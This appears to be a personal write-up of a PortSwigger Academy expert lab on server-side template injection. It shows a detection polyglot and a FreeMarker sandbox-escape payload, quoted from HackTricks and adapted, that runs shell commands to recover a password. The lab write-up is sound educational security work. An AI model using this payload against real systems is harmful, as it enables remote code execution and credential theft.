This is an expert level lab from portswigger academy.

If you've never heard of SSTI, my article on SSTI or my writeups on the easier level SSTI labs might be a better place to start.

logging in and navigating to the template editing area we find:
![[Pasted image 20251112172721.png]]

we can detect that there is a templating engine at work because the universal error based polyglot from hackmanit 
```<%'${{/#{@}}%>{{``` 
causes the html renderer to stop rendering the text

![[Pasted image 20251112172648.png]]

trying some variabls other that product.stock gets us an error message:

![[Pasted image 20251112172852.png]]
letting us know that freemarker is the templating engine being used

looking at the freemarker content of hacktricks we see https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#freemarker-java

```
java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

this seems to fail but reading the debug message carefully lets us know that it was because ```article ```  in ```classloader=article.class.protectionDomain.classLoader ```
 doesn't exist in this particular template
![[Pasted image 20251112182705.png]]


replacing that with a variable that does exist in this template (which we can see from the stock template of this and other products), the variable I tried was ```products ```

 gettting:
![[Pasted image 20251112175954.png]]

which successfully executes the code, hurrah!

now to get the password and submit it
![[Pasted image 20251112180056.png]]

![[Pasted image 20251112180124.png]]


other things I tried that were dead ends:

realising you can reflect user input at the account page via updating your email
![[Pasted image 20251112174151.png]]